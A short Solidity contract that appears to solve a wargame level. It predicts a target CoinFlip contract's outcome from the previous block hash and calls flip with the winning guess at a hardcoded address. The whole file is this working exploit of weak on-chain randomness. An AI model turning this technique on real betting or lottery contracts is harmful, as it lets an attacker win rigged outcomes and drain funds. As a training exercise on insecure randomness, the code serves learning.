// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/utils/math/SafeMath.sol";


pragma solidity ^0.8.7;



interface CoinFlip {
    function flip(bool _guess) external returns (bool);

}

contract CoinFlipped {
  using SafeMath for uint256;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        CoinFlip coinflip = CoinFlip(0x4B405C8b957fFf0d5532F50Ace70Ec38bb4132B7);
        
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        require(coinflip.flip(side));
    }

}
